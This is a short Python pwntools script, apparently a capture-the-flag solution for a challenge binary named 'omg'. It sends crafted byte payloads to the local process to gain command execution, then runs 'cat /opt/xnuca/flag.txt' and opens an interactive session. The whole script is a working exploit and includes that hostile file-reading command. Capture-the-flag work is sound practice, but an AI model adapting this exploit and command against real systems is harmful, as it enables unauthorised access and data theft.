from pwn import *
import hashlib

context.log_level = 'warn'

s='\xFE'*8
m2 = hashlib.md5()
m2.update(s)

payload0='\x05\x08'+s+'\xbb\x4e\x55\x0e\xd0\x48\xce\x92\x05\xb2\x24\xbf\xaa\x91\x31\x61'
payload1='\x07\x08'+s+'\xbb\x4e\x55\x0e\xd0\x48\xce\x92\x05\xb2\x24\xbf\xaa\x91\x31\x61'
payload2='\xC9\x08'+s+'\xbb\x4e\x55\x0e\xd0\x48\xce\x92\x05\xb2\x24\xbf\xaa\x91\x31\x61'

p = process('./omg')
p.send(payload1*2+payload0*2+payload2)
p.sendline('cat /opt/xnuca/flag.txt')
p.interactive()
